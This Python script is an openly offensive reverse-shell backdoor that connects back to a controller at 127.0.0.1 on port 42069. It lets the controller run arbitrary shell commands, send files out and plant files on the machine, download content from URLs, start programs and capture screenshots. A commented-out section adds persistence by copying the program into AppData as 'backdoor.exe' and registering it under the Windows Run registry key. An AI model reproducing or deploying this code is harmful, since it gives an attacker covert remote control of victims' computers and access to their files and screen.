#!/usr/bin/python

import socket
import subprocess
import json
import time
import shutil
import os
import sys # Needed for working of shutil
import requests
import base64
from mss import mss
import ctypes

def screenshot():
	with mss() as screenshot:
		screenshot.shot()
		# Saves the screenshot as monitor-1.png

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	file = open(file_name, "wb")
	file.write(get_response.content)
	file.close()

def reliable_send(data):
        json_data = json.dumps(data)
        s.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + s.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(("127.0.0.1", 42069))
			shell()
			break
		except:
			connection()

def shell():
	while True:
		# Receiving the command
		command = reliable_recv()

		# Sending the answer
		if command == 'q':
			break

		# Changing directory
		elif command[0:3] == 'cd ' and len(command) > 2:
			# Adding try and except if directory specified doesn't exist
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[0:8] == 'download':
			try:
				file = open(command[9:], "rb")
				reliable_send(base64.b64encode(file.read()))
				file.close()
			except:
				reliable_send(base64.b64encode("*[!] Download failed!"))
		elif command[0:6] == 'upload':
			file = open(command[7:], "wb")
			result = reliable_recv()
			file.write(base64.b64decode(result))
			file.close()
		elif command[0:3] == 'get':
			try:
				download(command[4:])
				reliable_send("[+] Successfully downloaded the file from the specified URL!")
			except:
				reliable_send("*[!] Unable to download the file!")
		elif command[0:5] == 'start':
			# Have to remove the stdin, stdout, stderror piping in the subprocess, as otherwise it waits unitl program is closed.
			try:
				subprocess.Popen(command[6:], shell = True)
				reliable_send('[+] Started!')
			except:
				reliable_send('[!] Failed to start!')
		elif command[0:10] == 'screenshot':
			try:
				screenshot()
				file = open('monitor-1.png', "rb")
				reliable_send(base64.b64encode(file.read()))
				os.remove('monitor-1.png')
			except:
				reilable_send('[!] Could not capture a screenshot!')
		else:
			try:
				process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				result = process.stdout.read() + process.stderr.read() # Storing the output of the command

				reliable_send(result)
			except:
				reliable_send("*[!] Can't execute the command")

#location = os.environ["appdata"] + "\\backdoor.exe"  # os.environ['appdata'] is the path to the roaming directory in app data in any pc.

#if not os.path.exists(location):
	# Now copy the shell to location using shutil
#	shutil.copyfile(sys.executable, location)

	# Now create the registry key to HK_CurrentUser
#	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell = True) # Executes this command which adds a registery in regedit.


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()

s.close()
